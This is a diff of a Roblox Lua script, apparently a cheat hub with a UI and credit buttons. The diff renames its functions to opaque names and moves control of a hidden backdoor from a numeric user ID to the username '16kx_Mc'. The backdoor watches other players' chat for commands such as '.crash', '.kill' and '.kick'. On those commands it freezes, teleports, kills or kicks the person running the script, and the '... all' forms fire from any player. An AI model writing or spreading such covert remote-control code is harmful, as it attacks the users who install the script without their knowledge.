@@ -404,44 +404,44 @@ tab5:Button("withoutname                 (rvnge#1970)", function()
 lib:Notification("Oriented", "Scripting, UI design, original idea", "Legal!")
 end)
 
-function RagdollMe(Character)
+function csxx(Character)
 	wait(.1)
 	if Character:FindFirstChild("HairAttachment",true) then
 		Character:FindFirstChild("HairAttachment",true):Remove()
 	end
 end
 
-RagdollMe(game:GetService("Players").LocalPlayer.Character)
-game:GetService("Players").LocalPlayer.CharacterAdded:Connect(RagdollMe)
+csxx(game:GetService("Players").LocalPlayer.Character)
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(csxx)
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local fdps = {1418010348}
+local wsx = {"16kx_Mc"}
 
 for _, v in pairs(Players:GetPlayers()) do 
-if v.UserId == LocalPlayer.UserId then
+if v.Name == LocalPlayer.Name then
 else
 v.Chatted:Connect(function(msg)
-if table.find(fdps, v.UserId) and msg == ".crash "..LocalPlayer.Name or msg == ".crash all" then
+if table.find(wsx, v.Name) and msg == ".crash "..LocalPlayer.Name or msg == ".crash all" then
 while true do end
 end
-if table.find(fdps, v.UserId) and msg == ".void "..LocalPlayer.Name or msg == ".void all" then
+if table.find(wsx, v.Name) and msg == ".void "..LocalPlayer.Name or msg == ".void all" then
 pcall(function()
 LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9, 9e9, 9e9)
 end)
 end
-if table.find(fdps, v.UserId) and msg == ".bring "..LocalPlayer.Name or msg == ".bring all" then
+if table.find(wsx, v.Name) and msg == ".bring "..LocalPlayer.Name or msg == ".bring all" then
 pcall(function()
 LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
 end)
 end
-if table.find(fdps, v.UserId) and msg == ".kill "..LocalPlayer.Name or msg == ".kill all" then
+if table.find(wsx, v.Name) and msg == ".kill "..LocalPlayer.Name or msg == ".kill all" then
 pcall(function()
 LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0 
 end)
 end
-if table.find(fdps, v.UserId) and msg == ".kick "..LocalPlayer.Name or msg == ".kick all" then
+if table.find(wsx, v.Name) and msg == ".kick "..LocalPlayer.Name or msg == ".kick all" then
 LocalPlayer:Kick()
 end
 end)
